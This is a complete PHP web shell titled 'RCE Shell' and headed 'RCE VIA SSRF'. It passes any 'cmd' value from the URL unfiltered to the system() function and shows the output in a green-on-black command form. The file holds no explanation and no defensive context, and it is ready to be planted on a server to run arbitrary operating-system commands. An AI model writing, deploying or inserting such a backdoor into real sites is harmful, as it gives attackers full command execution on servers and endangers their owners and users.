<?php
header('Content-Type: text/html');
if(isset($_GET['cmd'])) {
    echo "<pre style='background:#000;color:#0f0;padding:15px;border:1px solid #0f0;'>";
    echo "Command: " . htmlspecialchars($_GET['cmd']) . "\n\n";
    system($_GET['cmd']);
    echo "</pre>";
}
?>
<!DOCTYPE html>
<html>
<head>
  <title>RCE Shell</title>
  <style>
    body { background:#111; color:#0f0; font-family:monospace; padding:20px; text-align:center; }
    input, button { padding:10px; font-size:16px; margin:5px; }
    button { background:#0f0; color:#000; border:none; cursor:pointer; }
    h1 { color:#0f0; }
  </style>
</head>
<body>
  <h1>RCE VIA SSRF</h1>
  <form>
    <input type="text" name="cmd" placeholder="whoami" autofocus style="width:70%">
    <button>Run</button>
  </form>
  <hr>
</body>
</html>
